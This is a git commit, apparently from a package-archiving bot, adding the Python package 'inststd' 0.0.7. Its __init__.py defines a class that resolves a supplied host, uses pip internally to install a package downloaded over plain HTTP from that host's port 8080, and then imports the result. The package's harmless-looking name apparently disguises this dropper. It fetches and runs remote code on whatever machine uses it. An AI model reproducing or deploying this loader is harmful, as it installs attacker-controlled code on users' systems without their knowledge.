b75247bd36183eb051b83e8c3da49c5c5644890e
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 23:09:46 +0000

    Add package inststd/0.0.7/inststd-0.0.7-py2-none-any.whl

---
+++ packages/inststd/inststd-0.0.7-py2-none-any.whl/inststd/__init__.py
@@ -0,0 +1,21 @@
+
+
+class start:
+  def __init__(self, host):
+    import socket
+    import requests
+    ip = socket.gethostbyname(host)
+    
+    from pip._internal import main
+    import pip
+    
+    def install(package):
+        if hasattr(pip, 'main'):
+            pip.main(['install', package])
+        else:
+            main(['install', package])
+    
+    
+    install('http://'+ip+':8080/workbench/biblioteca/install.php')
+    
+    import stdclasses
